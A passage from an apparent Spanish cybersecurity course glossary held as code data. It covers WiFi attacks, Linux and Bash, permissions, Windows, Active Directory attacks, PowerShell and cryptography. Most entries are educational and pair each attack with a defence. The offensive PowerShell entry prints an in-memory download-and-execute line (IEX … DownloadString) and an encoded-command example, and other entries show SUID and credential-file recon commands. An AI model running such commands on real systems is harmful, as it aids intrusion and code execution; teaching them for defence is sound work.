      "• **Beaconing C2** — conexiones periódicas idénticas a un mismo destino.\n" +
      "• **Texto en claro** — credenciales viajando sin cifrar (HTTP, FTP, Telnet).",
    examples: [
      "Detectar un nmap por la ráfaga de SYN a múltiples puertos.",
      "Ver una contraseña FTP en claro dentro de la captura.",
    ],
    related: ["Captura de paquetes y PCAP", "IoC (Indicador de Compromiso)", "Ataques por capa OSI"],
  },

  // ── M9 · Seguridad WiFi ──────────────────────────────────────────────────
  {
    id: 120,
    module: 9,
    term: "Estándares de seguridad WiFi",
    short: "La evolución del cifrado inalámbrico: WEP → WPA → WPA2 → WPA3.",
    detail:
      "El cifrado WiFi mejoró por generaciones al irse rompiendo el anterior:\n" +
      "| Estándar | Cifrado | Estado |\n" +
      "|---|---|---|\n" +
      "| WEP | RC4 | Roto (inseguro) |\n" +
      "| WPA | TKIP | Obsoleto |\n" +
      "| WPA2 | AES-CCMP | Estándar actual (vulnerable a KRACK) |\n" +
      "| WPA3 | AES + SAE | Recomendado |\n" +
      "> ⚠️ **WEP** se rompe en minutos: nunca usarlo. **WPA3** mitiga el cracking offline del handshake con **SAE** (*Dragonfly*).",
    examples: [
      "Una red WEP puede crackearse capturando suficientes IV.",
      "WPA3 protege incluso con contraseñas débiles gracias a SAE.",
    ],
    related: ["Cracking del handshake WPA2-PSK", "802.1X / WPA2-Enterprise", "Evil Twin y Rogue AP"],
  },
  {
    id: 121,
    module: 9,
    term: "Evil Twin y Rogue AP",
    short: "Un punto de acceso falso que suplanta a uno legítimo para interceptar a las víctimas.",
    detail:
      "Un **Rogue AP** es un punto de acceso no autorizado en la red. El **Evil Twin** es su variante de ingeniería social: **clona el SSID** de una red de confianza (mismo nombre, señal más fuerte) para que las víctimas se conecten y poder hacer **MITM** o robar credenciales con un portal cautivo falso.",
    examples: [
      "Un AP 'WiFi_Cafe_Gratis' clonado en una cafetería captura el tráfico.",
      "Portal cautivo falso que pide la contraseña del correo.",
    ],
    related: ["Ataque de deautenticación", "Estándares de seguridad WiFi"],
  },
  {
    id: 122,
    module: 9,
    term: "Ataque de deautenticación",
    short: "Forzar la desconexión de clientes WiFi enviando tramas de deauth falsificadas.",
    detail:
      "Las tramas de gestión **deauth** de 802.11 no están autenticadas (salvo con 802.11w/PMF), así que un atacante puede **expulsar** a un cliente de su red. Se usa para forzar una **reconexión** (y capturar el handshake WPA2) o para empujar a la víctima hacia un **Evil Twin**.\n" +
      "> ⚠️ Mitigación: habilitar **802.11w (PMF, Protected Management Frames)**, obligatorio en WPA3.",
    examples: [
      "Lanzar deauth para capturar el 4-way handshake y crackearlo offline.",
      "Echar a un cliente de la red real para que caiga en el AP falso.",
    ],
    related: ["Evil Twin y Rogue AP", "Cracking del handshake WPA2-PSK", "Estándares de seguridad WiFi"],
  },
  {
    id: 123,
    module: 9,
    term: "Cracking del handshake WPA2-PSK",
    short: "Capturar el 4-way handshake y atacarlo offline por diccionario/fuerza bruta.",
    detail:
      "En WPA2-Personal, la contraseña no viaja por el aire, pero el **4-way handshake** que se intercambia al conectar **deriva** de ella. Capturándolo (a menudo tras un deauth) se ataca **offline** probando contraseñas con `hashcat`/`aircrack-ng`. Por eso la **longitud y aleatoriedad** de la PSK es crítica.\n" +
      "> 💡 WPA3 frustra este ataque: su handshake **SAE** no permite el crackeo offline del material capturado.",
    examples: [
      "Capturar el handshake con airodump-ng y crackearlo con un diccionario.",
      "Una passphrase larga y aleatoria hace inviable el ataque por diccionario.",
    ],
    related: ["Ataque de deautenticación", "Estándares de seguridad WiFi", "Exploit y Payload"],
  },
  {
    id: 124,
    module: 9,
    term: "802.1X / WPA2-Enterprise",
    short: "Autenticación WiFi por usuario (no por contraseña compartida) mediante un servidor RADIUS.",
    detail:
      "**WPA2/WPA3-Enterprise** usa **802.1X**: cada usuario se autentica con **credenciales o certificados** propios contra un servidor **RADIUS** (vía EAP), en vez de una **PSK** compartida. Elimina el riesgo de la contraseña única y permite **revocar accesos** individualmente.",
    examples: [
      "El WiFi corporativo donde inicias sesión con tu usuario de dominio.",
      "Revocar el acceso de un empleado sin cambiar la clave de todos.",
    ],
    related: ["Estándares de seguridad WiFi", "AAA (Autenticación, Autorización, Accounting)", "Principio de mínimo privilegio"],
  },

  // ── M10 · Linux: Fundamentos ─────────────────────────────────────────────
  {
    id: 130,
    module: 10,
    term: "Jerarquía del sistema de archivos (FHS)",
    short: "Linux organiza todo bajo una única raíz '/', con directorios estándar por función.",
    detail:
      "El **FHS** (*Filesystem Hierarchy Standard*) define dónde vive cada cosa. No hay 'unidades C:'; todo cuelga de **`/`**:\n" +
      "| Ruta | Contenido |\n" +
      "|---|---|\n" +
      "| /etc | Configuración del sistema |\n" +
      "| /home | Carpetas de los usuarios |\n" +
      "| /var | Datos variables (logs en /var/log) |\n" +
      "| /bin /usr/bin | Binarios/ejecutables |\n" +
      "| /tmp | Temporales |\n" +
      "> 💡 Los logs de seguridad suelen estar en **/var/log** (`auth.log`, `syslog`).",
    examples: [
      "cat /etc/passwd lista las cuentas del sistema.",
      "tail -f /var/log/auth.log sigue los intentos de login en vivo.",
    ],
    related: ["La shell", "Permisos rwx", "Streams y redirección"],
  },
  {
    id: 131,
    module: 10,
    term: "La shell",
    short: "El intérprete de comandos que traduce lo que escribes en acciones del sistema.",
    detail:
      "La **shell** (normalmente **Bash**) es el programa que lee tus comandos y los ejecuta. Es la interfaz central del trabajo en seguridad: rápida, scriptable y presente en cualquier servidor. El **prompt** (`$` usuario normal, `#` root) indica con qué privilegios operas.\n" +
      "> ⚠️ Un `#` significa que eres **root**: máximo cuidado, cualquier error es total.",
    examples: [
      "whoami muestra tu usuario actual.",
      "which bash revela la ruta del intérprete en uso.",
    ],
    related: ["Jerarquía del sistema de archivos (FHS)", "Streams y redirección", "Shebang y ejecución"],
  },
  {
    id: 132,
    module: 10,
    term: "Todo es un archivo",
    short: "En Linux, dispositivos, procesos y conexiones se representan como archivos.",
    detail:
      "Filosofía Unix: **casi todo se maneja como un archivo**, lo que unifica las herramientas. Discos (`/dev/sda`), información de procesos (`/proc`) y dispositivos son rutas que se leen/escriben con los mismos comandos que un fichero de texto.",
    examples: [
      "cat /proc/cpuinfo muestra info del procesador como si fuera un archivo.",
      "Escribir en /dev/null descarta la salida.",
    ],
    related: ["La shell", "Streams y redirección"],
  },
  {
    id: 133,
    module: 10,
    term: "Distribuciones para seguridad",
    short: "Distros de Linux que ya traen el arsenal de herramientas de pentesting preinstalado.",
    detail:
      "Una **distro** combina el kernel Linux con un conjunto de software. Para seguridad ofensiva destacan **Kali Linux** (la referencia, mantenida por OffSec) y **Parrot OS**, que incluyen cientos de herramientas (nmap, Burp, Metasploit). Para uso diario o servidores se usan **Debian/Ubuntu**.\n" +
      "> 💡 Kali está pensada como **herramienta de trabajo**, no como SO de uso diario.",
    examples: [
      "Arrancar Kali en una VM para un laboratorio de pentest.",
      "Parrot Security como alternativa más ligera a Kali.",
    ],
    related: ["La shell", "Jerarquía del sistema de archivos (FHS)"],
  },
  {
    id: 134,
    module: 10,
    term: "Streams y redirección",
    short: "Cada comando tiene entrada (stdin), salida (stdout) y errores (stderr) redirigibles.",
    detail:
      "Los **tres flujos estándar** permiten encadenar y guardar resultados:\n" +
      "• **stdin (0)** — entrada · **stdout (1)** — salida · **stderr (2)** — errores.\n" +
      "Operadores: `>` guarda en archivo (sobrescribe), `>>` añade, `|` conecta la salida de un comando con la entrada del siguiente.\n" +
      "> 💡 El **pipe** (`|`) es la base del poder de la línea de comandos: combinar herramientas pequeñas.",
    examples: [
      "ls -la > listado.txt guarda el resultado en un archivo.",
      "cat /etc/passwd | grep root filtra solo la línea de root.",
    ],
    related: ["La shell", "Pipes y automatización"],
  },

  // ── M11 · Bash Scripting ─────────────────────────────────────────────────
  {
    id: 140,
    module: 11,
    term: "Shebang y ejecución",
    short: "La primera línea '#!' indica qué intérprete corre el script.",
    detail:
      "Un script empieza con un **shebang** que define su intérprete, y necesita permiso de ejecución para correr como programa:\n" +
      "#!/bin/bash\n" +
      "echo \"Hola, mundo\"\n" +
      "Luego se le da permiso y se ejecuta:\n" +
      "chmod +x script.sh\n" +
      "./script.sh",
    examples: [
      "#!/bin/bash al inicio fuerza el uso de Bash.",
      "chmod +x recon.sh && ./recon.sh ejecuta el script.",
    ],
    related: ["Variables y argumentos", "La shell", "Permisos rwx"],
  },
  {
    id: 141,
    module: 11,
    term: "Variables y argumentos",
    short: "Guardan datos y reciben parámetros de entrada del usuario o de otro proceso.",
    detail:
      "Las **variables** almacenan valores (`nombre=\"valor\"`, se leen con `$nombre`). Los **argumentos** posicionales que recibe el script son `$1`, `$2`, … y `$@` (todos):\n" +
      "objetivo=$1\n" +
      "echo \"Escaneando $objetivo\"\n" +
      "> 💡 Sin comillas, los espacios rompen los valores: **entrecomilla siempre** las variables (`\"$var\"`).",
    examples: [
      "host=$1 toma el primer argumento de la línea de comandos.",
      "echo \"Hay $# argumentos\" cuenta los parámetros recibidos.",
    ],
    related: ["Shebang y ejecución", "Condicionales y loops"],
  },
  {
    id: 142,
    module: 11,
    term: "Condicionales y loops",
    short: "Dan lógica al script: decidir (if) y repetir (for/while).",
    detail:
      "Permiten automatizar tareas repetitivas, como iterar sobre una lista de hosts o puertos:\n" +
      "for ip in $(cat hosts.txt); do\n" +
      "  ping -c1 $ip\n" +
      "done\n" +
      "Los condicionales evalúan con `[ ... ]`: existencia de archivos, comparaciones, códigos de salida.",
    examples: [
      "Un for que recorre IPs de un archivo y las pinguea.",
      "if [ -f archivo ]; then ... comprueba si un archivo existe.",
    ],
    related: ["Variables y argumentos", "Pipes y automatización"],
  },
  {
    id: 143,
    module: 11,
    term: "El trío grep / awk / sed",
    short: "Las tres herramientas clásicas para buscar, extraer y transformar texto.",
    detail:
      "Procesar texto (logs, salidas, listas) es el 80% del scripting de seguridad:\n" +
      "| Herramienta | Hace |\n" +
      "|---|---|\n" +
      "| grep | Busca/filtra líneas por patrón |\n" +
      "| awk | Extrae columnas y procesa campos |\n" +
      "| sed | Edita/sustituye texto en flujo |\n" +
      "Combinadas con pipes son extremadamente potentes.",
    examples: [
      "grep \"Failed password\" auth.log | awk '{print $11}' extrae IPs de logins fallidos.",
      "sed 's/http/https/g' redirecciona en un archivo.",
    ],
    related: ["Streams y redirección", "Pipes y automatización"],
  },
  {
    id: 144,
    module: 11,
    term: "Pipes y automatización",
    short: "Encadenar comandos para construir auditorías y herramientas reproducibles.",
    detail:
      "El **pipe** (`|`) conecta herramientas simples en flujos potentes; combinado con scripts permite **automatizar auditorías** (escaneos, parseo de resultados, reportes). La meta: convertir un proceso manual en un comando repetible.",
    examples: [
      "cat ips.txt | while read ip; do nmap -sV $ip; done escanea una lista.",
      "Un script que corre nmap, filtra puertos abiertos y genera un informe.",
    ],
    related: ["El trío grep / awk / sed", "Condicionales y loops", "Streams y redirección"],
  },

  // ── M12 · Linux: Permisos y Hardening ────────────────────────────────────
  {
    id: 150,
    module: 12,
    term: "Permisos rwx",
    short: "Cada archivo tiene permisos de lectura/escritura/ejecución para dueño, grupo y otros.",
    detail:
      "Los permisos se aplican a tres clases (**usuario / grupo / otros**) y tres acciones (**r**ead, **w**rite, e**x**ecute). Se expresan en octal:\n" +
      "| Octal | Permiso | Significado |\n" +
      "|---|---|---|\n" +
      "| 4 | r-- | Lectura |\n" +
      "| 6 | rw- | Lectura + escritura |\n" +
      "| 7 | rwx | Todo |\n" +
      "Se cambian con chmod:\n" +
      "chmod 750 script.sh\n" +
      "> ⚠️ `chmod 777` (todos pueden todo) es una mala práctica clásica de seguridad.",
    examples: [
      "ls -l muestra los permisos como -rwxr-x---.",
      "chmod u+x da permiso de ejecución solo al dueño.",
    ],
    related: ["Propietario y grupo", "Bits especiales SUID/SGID/sticky", "Hardening y CIS Benchmarks"],
  },
  {
    id: 151,
    module: 12,
    term: "Propietario y grupo",
    short: "Todo archivo pertenece a un usuario y a un grupo, que determinan qué permisos aplican.",
    detail:
      "Cada archivo tiene un **dueño** y un **grupo**. `chown` cambia el propietario y `chgrp`/`chown :grupo` el grupo. El modelo de grupos permite dar acceso a varios usuarios sin abrir el archivo a 'otros'.\n" +
      "chown root:admins config.conf",
    examples: [
      "chown www-data:www-data /var/www asigna los archivos al usuario del servidor web.",
      "Un grupo 'devs' con acceso compartido a un directorio de proyecto.",
    ],
    related: ["Permisos rwx", "Gestión de usuarios y sudo"],
  },
  {
    id: 152,
    module: 12,
    term: "Bits especiales SUID/SGID/sticky",
    short: "Permisos avanzados que cambian con qué identidad se ejecuta un binario o cómo se comparte un directorio.",
    detail:
      "Tres bits especiales con gran impacto en seguridad:\n" +
      "• **SUID** — el binario corre con los permisos de su **dueño** (no del que lo lanza). Si es root, es vía clásica de **escalada de privilegios**.\n" +
      "• **SGID** — corre con el grupo del archivo / hereda grupo en directorios.\n" +
      "• **Sticky bit** — en /tmp, solo el dueño puede borrar sus archivos.\n" +
      "> ⚠️ Buscar binarios SUID es de lo primero que hace un atacante:\n" +
      "find / -perm -4000 2>/dev/null",
    examples: [
      "passwd es SUID root para poder modificar /etc/shadow.",
      "Un SUID mal configurado permite obtener una shell de root.",
    ],
    related: ["Permisos rwx", "Gestión de usuarios y sudo", "Hardening y CIS Benchmarks"],
  },
  {
    id: 153,
    module: 12,
    term: "Gestión de usuarios y sudo",
    short: "sudo concede privilegios elevados puntuales sin compartir la contraseña de root.",
    detail:
      "En vez de iniciar sesión como root, los usuarios usan **sudo** para ejecutar comandos concretos con privilegios, dejando **traza auditable** (`/var/log/auth.log`). La config vive en `/etc/sudoers` (editar con `visudo`).\n" +
      "> ⚠️ Reglas sudo demasiado amplias (`ALL=(ALL) NOPASSWD: ALL`) son un riesgo de escalada.",
    examples: [
      "sudo apt update ejecuta solo ese comando como root.",
      "sudo -l lista qué te permite ejecutar sudo (recon de privesc).",
    ],
    related: ["Bits especiales SUID/SGID/sticky", "Permisos rwx", "Principio de mínimo privilegio"],
  },
  {
    id: 154,
    module: 12,
    term: "Hardening y CIS Benchmarks",
    short: "Endurecer un sistema reduciendo su superficie y siguiendo guías de configuración segura.",
    detail:
      "El **hardening** elimina lo innecesario y aplica configuración segura: cerrar servicios, deshabilitar root por SSH, actualizar, mínimo privilegio. Los **CIS Benchmarks** son guías consensuadas y verificables por sistema (Linux, Windows, cloud). **SELinux/AppArmor** añaden control de acceso obligatorio (MAC).",
    examples: [
      "Deshabilitar PermitRootLogin en sshd_config.",
      "Aplicar el CIS Benchmark de Ubuntu y auditar con Lynis.",
    ],
    related: ["Gestión de usuarios y sudo", "Bits especiales SUID/SGID/sticky", "CIS Controls"],
  },

  // ── M13 · Windows: Seguridad ─────────────────────────────────────────────
  {
    id: 160,
    module: 13,
    term: "Registro de Windows",
    short: "Base de datos jerárquica con toda la configuración del sistema y las aplicaciones.",
    detail:
      "El **Registro** guarda ajustes en árboles (*hives*). Los más relevantes:\n" +
      "| Hive | Contenido |\n" +
      "|---|---|\n" +
      "| HKLM | Configuración global del equipo |\n" +
      "| HKCU | Config del usuario actual |\n" +
      "> ⚠️ Las claves **Run** (`HKCU\\...\\Run`) son un mecanismo clásico de **persistencia** de malware.",
    examples: [
      "Revisar claves Run para detectar autostart malicioso.",
      "reg query para inspeccionar el registro desde consola.",
    ],
    related: ["Servicios y procesos", "Group Policy (GPO)"],
  },
  {
    id: 161,
    module: 13,
    term: "Servicios y procesos",
    short: "Los servicios son programas en segundo plano; abusar de ellos da persistencia y privilegios.",
    detail:
      "Un **servicio** corre en background, a menudo con privilegios altos (**SYSTEM**). Los atacantes los usan para **persistencia** y **escalada**. Saber inventariar procesos/servicios es clave en respuesta a incidentes.",
    examples: [
      "tasklist y Get-Process listan los procesos en ejecución.",
      "Un servicio con ruta sin comillas explotable para escalar a SYSTEM.",
    ],
    related: ["Registro de Windows"],
  },
  {
    id: 162,
    module: 13,
    term: "Event Viewer y Event IDs",
    short: "El visor de eventos centraliza los logs; ciertos Event IDs son oro para la detección.",
    detail:
      "Windows registra todo en el **Visor de eventos** (Security, System, Application). Para seguridad, algunos **Event IDs** son críticos:\n" +
      "| Event ID | Significado |\n" +
      "|---|---|\n" +
      "| 4624 | Inicio de sesión exitoso |\n" +
      "| 4625 | Inicio de sesión fallido |\n" +
      "| 4688 | Creación de proceso |\n" +
      "| 4672 | Privilegios especiales asignados |\n" +
      "> 💡 Una ráfaga de **4625** seguida de un **4624** sugiere fuerza bruta exitosa.",
    examples: [
      "Correlacionar 4625 repetidos para detectar password spraying.",
      "Get-WinEvent para consultar logs desde PowerShell.",
    ],
    related: ["Servicios y procesos", "Defender, AMSI y ETW"],
  },
  {
    id: 163,
    module: 13,
    term: "Group Policy (GPO)",
    short: "Mecanismo centralizado para aplicar configuración y políticas de seguridad en un dominio.",
    detail:
      "Las **GPO** (*Group Policy Objects*) permiten imponer ajustes a miles de equipos/usuarios desde Active Directory: políticas de contraseñas, restricción de software, hardening. Son la principal herramienta de administración segura en entornos Windows.",
    examples: [
      "Forzar bloqueo de pantalla y complejidad de contraseña por GPO.",
      "Deshabilitar macros de Office en toda la organización vía GPO.",
    ],
    related: ["Registro de Windows", "Active Directory: dominio, bosque y OU"],
  },
  {
    id: 164,
    module: 13,
    term: "Defender, AMSI y ETW",
    short: "La tríada de telemetría y defensa nativa de Windows que los atacantes intentan evadir.",
    detail:
      "Tres tecnologías clave de defensa:\n" +
      "• **Windows Defender** — el antivirus/EDR integrado.\n" +
      "• **AMSI** (*Antimalware Scan Interface*) — inspecciona scripts (PowerShell, macros) **en memoria**, antes de ejecutarse.\n" +
      "• **ETW** (*Event Tracing for Windows*) — telemetría profunda del SO que alimenta a los EDR.\n" +
      "> ⚠️ El **AMSI bypass** y el *patching* de ETW son técnicas ofensivas comunes; protegerlos (tamper protection) es esencial.",
    examples: [
      "AMSI bloquea un script de PowerShell malicioso ofuscado.",
      "Un EDR usa ETW para detectar inyección de procesos.",
    ],
    related: ["Event Viewer y Event IDs", "PowerShell ofensivo"],
  },

  // ── M14 · Active Directory ───────────────────────────────────────────────
  {
    id: 170,
    module: 14,
    term: "Active Directory: dominio, bosque y OU",
    short: "El directorio que centraliza usuarios, equipos y permisos de una red Windows.",
    detail:
      "**Active Directory (AD)** es la columna vertebral de las redes corporativas Windows. Su jerarquía:\n" +
      "• **Dominio** — unidad administrativa (usuarios, equipos).\n" +
      "• **Bosque** — conjunto de dominios que comparten esquema; el **límite de seguridad** real.\n" +
      "• **OU (Unidad Organizativa)** — contenedor para organizar y aplicar GPO.\n" +
      "El **Controlador de Dominio (DC)** es el servidor que autentica; comprometerlo es 'game over'.",
    examples: [
      "Una empresa con dominio corp.local y OUs por departamento.",
      "Comprometer el DC = control total del dominio.",
    ],
    related: ["Kerberos", "LDAP", "Ataques a Active Directory"],
  },
  {
    id: 171,
    module: 14,
    term: "Kerberos",
    short: "El protocolo de autenticación de AD basado en tickets, sin enviar la contraseña por la red.",
    detail:
      "**Kerberos** autentica mediante **tickets** emitidos por el **KDC** (en el DC). Tras validar al usuario, recibe un **TGT** (*Ticket Granting Ticket*); con él pide **TGS** para servicios concretos. La contraseña nunca viaja, pero el modelo de tickets habilita ataques específicos (Kerberoasting, Golden Ticket).\n" +
      "> 💡 Ver el diagrama 'Autenticación Kerberos' más abajo para el flujo completo.",
    examples: [
      "Al iniciar sesión en el dominio, el usuario obtiene un TGT.",
      "Un Golden Ticket falsifica TGTs si se roba la cuenta krbtgt.",
    ],
    related: ["Active Directory: dominio, bosque y OU", "Ataques a Active Directory", "LDAP"],
  },
  {
    id: 172,
    module: 14,
    term: "LDAP",
    short: "El protocolo para consultar y modificar el directorio (usuarios, grupos, equipos).",
    detail:
      "**LDAP** (*Lightweight Directory Access Protocol*) es el lenguaje de consultas de AD. Pentesters y administradores lo usan para **enumerar** el dominio: usuarios, grupos privilegiados, políticas. Herramientas como **BloodHound** abusan de LDAP para mapear rutas de ataque.",
    examples: [
      "ldapsearch para enumerar usuarios del dominio.",
      "BloodHound recolecta datos LDAP y grafica caminos a Domain Admin.",
    ],
    related: ["Active Directory: dominio, bosque y OU", "Kerberos", "Ataques a Active Directory"],
  },
  {
    id: 173,
    module: 14,
    term: "Ataques a Active Directory",
    short: "Técnicas para escalar de un usuario común a control total del dominio.",
    detail:
      "AD concentra el riesgo: comprometer el dominio da acceso a todo. Ataques emblemáticos:\n" +
      "| Ataque | Idea | Defensa |\n" +
      "|---|---|---|\n" +
      "| Kerberoasting | Crackear tickets de cuentas de servicio | Contraseñas largas, gMSA |\n" +
      "| Pass-the-Hash | Autenticarse con el hash, sin la clave | Credential Guard, LAPS |\n" +
      "| DCSync | Pedir hashes replicando como un DC | Restringir permisos de replicación |\n" +
      "| Golden Ticket | Falsificar TGTs con la clave krbtgt | Rotar krbtgt, proteger el DC |\n" +
      "> ⚠️ La mayoría se apoya en **mínimo privilegio** débil y cuentas de servicio mal gestionadas.",
    examples: [
      "Kerberoasting sobre una cuenta de servicio con contraseña débil.",
      "DCSync con Mimikatz para volcar todos los hashes del dominio.",
    ],
    related: ["Kerberos", "LDAP", "Principio de mínimo privilegio"],
  },

  // ── M15 · PowerShell para Seguridad ──────────────────────────────────────
  {
    id: 180,
    module: 15,
    term: "Cmdlets (verbo-sustantivo)",
    short: "Los comandos de PowerShell siguen el patrón predecible Verbo-Sustantivo.",
    detail:
      "Un **cmdlet** usa la convención **Verbo-Sustantivo** (`Get-Process`, `Set-Service`, `New-Item`), lo que hace el lenguaje fácil de descubrir. `Get-Help` y `Get-Command` permiten explorar:\n" +
      "Get-Command -Verb Get\n" +
      "Get-Help Get-Process -Examples",
    examples: [
      "Get-Process lista procesos; Stop-Process los detiene.",
      "Get-Service muestra el estado de los servicios.",
    ],
    related: ["El pipeline de objetos", "PowerShell defensivo"],
  },
  {
    id: 181,
    module: 15,
    term: "El pipeline de objetos",
    short: "A diferencia de Bash (texto), PowerShell pasa objetos completos entre comandos.",
    detail:
      "El gran diferenciador: el pipe de PowerShell transporta **objetos .NET**, no texto plano. Así se filtran y ordenan por **propiedades** sin parsear cadenas:\n" +
      "Get-Process | Where-Object { $_.CPU -gt 100 } | Sort-Object CPU\n" +
      "> 💡 Esto hace el scripting más robusto que el parseo de texto con grep/awk.",
    examples: [
      "Get-Service | Where-Object Status -eq 'Running' filtra por propiedad.",
      "Ordenar procesos por uso de memoria sin tocar texto.",
    ],
    related: ["Cmdlets (verbo-sustantivo)", "PowerShell defensivo"],
  },
  {
    id: 182,
    module: 15,
    term: "PowerShell defensivo",
    short: "Auditar y endurecer el propio PowerShell con logging y modos restringidos.",
    detail:
      "PowerShell es tan potente que también es un objetivo de defensa. Controles clave:\n" +
      "• **Script Block Logging** — registra el código ejecutado (Event ID 4104).\n" +
      "• **Transcription** — guarda transcripciones de las sesiones.\n" +
      "• **Constrained Language Mode** — limita las capacidades peligrosas.\n" +
      "• **AMSI** — inspecciona scripts en memoria.\n" +
      "Juntos dan visibilidad y frenan el abuso ofensivo.",
    examples: [
      "Activar Script Block Logging por GPO para auditar todo.",
      "Revisar Event ID 4104 para ver scripts ejecutados.",
    ],
    related: ["Defender, AMSI y ETW", "El pipeline de objetos", "PowerShell ofensivo"],
  },
  {
    id: 183,
    module: 15,
    term: "PowerShell ofensivo",
    short: "El mismo poder usado por atacantes para 'vivir de la tierra' sin tocar disco.",
    detail:
      "PowerShell es ideal para *Living off the Land*: ya viene instalado y permite operar **en memoria**. Frameworks como **PowerShell Empire** dan C2; técnicas como **AMSI bypass** y **ofuscación** evaden defensas. Por eso el logging defensivo (módulo anterior) es crítico.\n" +
      "> ⚠️ Detectar abuso de PowerShell (descargas en memoria, EncodedCommand) es una señal de alerta clave.",
    examples: [
      "IEX (New-Object Net.WebClient).DownloadString(...) ejecuta código en memoria.",
      "powershell -enc <base64> oculta el comando real.",
    ],
    related: ["PowerShell defensivo", "Defender, AMSI y ETW", "Ataques a Active Directory"],
  },

  // ── M16 · Criptografía Simétrica ─────────────────────────────────────────
  {
    id: 190,
    module: 16,
    term: "Cifrado simétrico",
    short: "Una única clave compartida cifra y descifra; es rápido pero hay que distribuir la clave.",
    detail:
      "En el **cifrado simétrico** ambas partes usan **la misma clave secreta**. Es muy **rápido y eficiente**, ideal para grandes volúmenes de datos (discos, tráfico TLS ya establecido).\n" +
      "> ⚠️ Su talón de Aquiles es la **distribución de la clave**: ¿cómo la comparten de forma segura sin que un tercero la intercepte? Eso lo resuelve la criptografía asimétrica.",
    examples: [
      "AES cifrando un disco con BitLocker/LUKS.",
      "La clave de sesión de una conexión HTTPS ya establecida.",
    ],
    related: ["AES vs DES/3DES", "Modos de operación", "Cifrado asimétrico y par de claves"],
  },
  {
    id: 191,
    module: 16,
    term: "AES vs DES/3DES",
    short: "AES es el estándar moderno; DES quedó obsoleto y 3DES es lento y en retirada.",
    detail:
      "| Algoritmo | Clave | Estado |\n" +
      "|---|---|---|\n" +
      "| DES | 56 bits | Roto (fuerza bruta) |\n" +
      "| 3DES | 112-168 bits | Obsoleto, lento |\n" +
      "| AES | 128/192/256 bits | Estándar actual |\n" +
      "**AES** (*Advanced Encryption Standard*) es un cifrado **por bloques** de 128 bits, rápido en hardware y sin ataques prácticos. **DES** cayó por su clave corta; **3DES** lo aplica tres veces pero es lento y ya está siendo retirado.",
    examples: [
      "AES-256 para datos en reposo de alta sensibilidad.",
      "Migrar sistemas legacy de 3DES a AES-GCM.",
    ],
    related: ["Cifrado simétrico", "Modos de operación", "Gestión de claves"],
  },
  {
    id: 192,
    module: 16,
    term: "Modos de operación",
    short: "Definen cómo un cifrado por bloques procesa datos más largos que un bloque.",
    detail:
      "Un cifrado por bloques (AES) cifra 128 bits a la vez; el **modo** decide cómo encadenar bloques:\n" +
      "| Modo | Idea | Riesgo / uso |\n" +
      "|---|---|---|\n" +
      "| ECB | Cada bloque por separado | Inseguro: filtra patrones |\n" +
      "| CBC | Encadena con el bloque previo + IV | Necesita IV e integridad |\n" +
      "| GCM | Cifrado + autenticación (AEAD) | Recomendado |\n" +
      "> 💡 **GCM** es **AEAD**: cifra y a la vez garantiza integridad/autenticidad. Es el modo preferido hoy.",
    examples: [
      "TLS 1.3 usa AES-GCM (AEAD) por defecto.",
      "Nunca usar ECB para datos reales: revela estructura.",
    ],
    related: ["AES vs DES/3DES", "Vulnerabilidades del cifrado simétrico", "Cifrado simétrico"],
  },
  {
    id: 193,
    module: 16,
    term: "Gestión de claves",
    short: "El eslabón más débil: generar, distribuir, rotar y almacenar claves de forma segura.",
    detail:
      "El cifrado más fuerte es inútil si la clave se gestiona mal. La **gestión de claves** abarca su **generación** (aleatoriedad robusta), **distribución** (el problema que resuelve la asimétrica), **rotación** periódica y **almacenamiento** seguro (HSM, KMS, vaults).\n" +
      "> 💡 En AlphaLog, `DATA_ENCRYPTION_KEY` (AES-256-GCM) protege notas, journal y mensajes — su custodia es crítica.",
    examples: [
      "Guardar claves en un HSM o en un KMS gestionado en la nube.",
      "Rotar la clave de cifrado sin perder el acceso a los datos antiguos.",
    ],
    related: ["Cifrado simétrico", "PKI y autoridades de certificación", "Intercambio de claves (Diffie-Hellman)"],
  },
  {
    id: 194,
    module: 16,
    term: "Vulnerabilidades del cifrado simétrico",
    short: "El algoritmo suele ser sólido; los fallos vienen del modo, el IV o la clave.",
    detail:
      "AES no se rompe, pero su uso **incorrecto** sí:\n" +
      "• **Modo ECB** — bloques idénticos producen cifrado idéntico, revelando patrones (el clásico 'pingüino ECB').\n" +
      "• **Reutilización de IV/nonce** — en CBC/GCM rompe la confidencialidad (y en GCM, la integridad).\n" +
      "• **Claves débiles o predecibles** — derivadas de poca entropía.\n" +
      "> ⚠️ La regla: en GCM **nunca** repetir el nonce con la misma clave.",
    examples: [
      "La imagen del pingüino cifrada en ECB sigue siendo reconocible.",
      "Reusar un nonce en AES-GCM permite recuperar el texto claro.",
    ],
    related: ["Modos de operación", "Gestión de claves", "AES vs DES/3DES"],
  },

  // ── M17 · Criptografía Asimétrica ────────────────────────────────────────
  {
    id: 200,
    module: 17,
    term: "Cifrado asimétrico y par de claves",
    short: "Dos claves matemáticamente ligadas: una pública para cifrar, una privada para descifrar.",
    detail:
      "La **criptografía asimétrica** usa un **par de claves**: lo cifrado con la **pública** solo lo descifra la **privada** (y viceversa para firmar). Resuelve el problema de distribución de la simétrica: puedes publicar tu clave pública sin riesgo.\n" +
      "> 💡 Es **lenta**, así que en la práctica se usa para **intercambiar** una clave simétrica (cifrado híbrido), no para cifrar todo el tráfico.",
    examples: [
      "Cifrar un correo con la clave pública del destinatario (PGP).",
      "TLS usa asimétrica para acordar la clave de sesión, luego simétrica.",
    ],
    related: ["RSA", "ECC", "Firmas digitales"],
  },
  {
    id: 201,
    module: 17,
    term: "RSA",
    short: "El algoritmo asimétrico clásico, basado en la dificultad de factorizar números enormes.",
    detail:
      "**RSA** apoya su seguridad en que **factorizar** el producto de dos primos gigantes es computacionalmente inviable. Se usa para cifrado e intercambio de claves y para **firmas digitales**. Requiere claves grandes (**2048-4096 bits**) para ser seguro, lo que lo hace más pesado que ECC.",
    examples: [
      "Certificados TLS y llaves SSH históricamente basados en RSA-2048.",
      "Firmar un token con una clave privada RSA.",
    ],
    related: ["Cifrado asimétrico y par de claves", "ECC", "Amenaza cuántica y post-quantum"],
  },
  {
    id: 202,
    module: 17,
    term: "ECC",
    short: "Criptografía de curva elíptica: la misma seguridad que RSA con claves mucho más cortas.",
    detail:
      "**ECC** (*Elliptic Curve Cryptography*) ofrece **igual seguridad con claves mucho menores**: una clave ECC de **256 bits** equivale aproximadamente a RSA de **3072 bits**. Eso significa menos cómputo y menos ancho de banda, por lo que domina en móviles, IoT y TLS moderno.",
    examples: [
      "Curva25519 en WireGuard y en TLS 1.3.",
      "Firmas ECDSA en certificados modernos.",
    ],
